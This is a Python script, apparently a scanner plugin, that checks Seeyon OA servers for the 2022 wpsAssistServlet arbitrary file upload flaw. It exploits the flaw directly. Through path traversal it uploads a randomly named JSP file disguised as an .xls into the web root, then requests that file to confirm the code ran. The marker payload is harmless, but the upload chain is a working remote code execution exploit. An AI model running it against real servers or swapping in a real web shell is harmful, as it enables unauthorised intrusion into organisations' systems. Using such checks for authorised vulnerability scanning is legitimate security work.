import requests
import re, time
import urllib, random, string

def verify(url):
    relsult = {
        'name': '致远OA wpsAssistServlet 任意文件上传-2022',
        'vulnerable': False
    }
    randstr1 = ''.join(random.sample(string.digits + string.ascii_letters, 4))
    randstr2 = ''.join(random.sample(string.digits + string.ascii_letters, 4))
    shell = f'<% out.println("{randstr1}" + "{randstr2}"); %>'
    filename = ''.join(random.sample(string.digits + string.ascii_letters, 8)) + '.jsp'
    payload = f'/seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/{filename}&fileId=2'
    timeout = 5
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
        'Content-Type': 'multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b',
    }
    vurl = urllib.parse.urljoin(url, payload)
    data = '--59229605f98b8cf290a7b8908b34616b\r\nContent-Disposition: form-data; name="upload"; filename="123.xls"\r\nContent-Type: application/vnd.ms-excel\r\n\r\n{0}\r\n--59229605f98b8cf290a7b8908b34616b--'.format(shell)
    verify_url = urllib.parse.urljoin(url, filename)
    try:
        rep = requests.post(vurl, headers=headers, timeout=timeout, data=data, verify=False)
        if rep.status_code == 200:
            rep2 = requests.get(verify_url, timeout=timeout, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}, verify=False)
            if rep2.status_code == 200 and re.search(randstr1 + randstr2, rep2.text):
                relsult['vulnerable'] = True
                relsult['verify'] = verify_url
        return relsult
    except:
        return relsult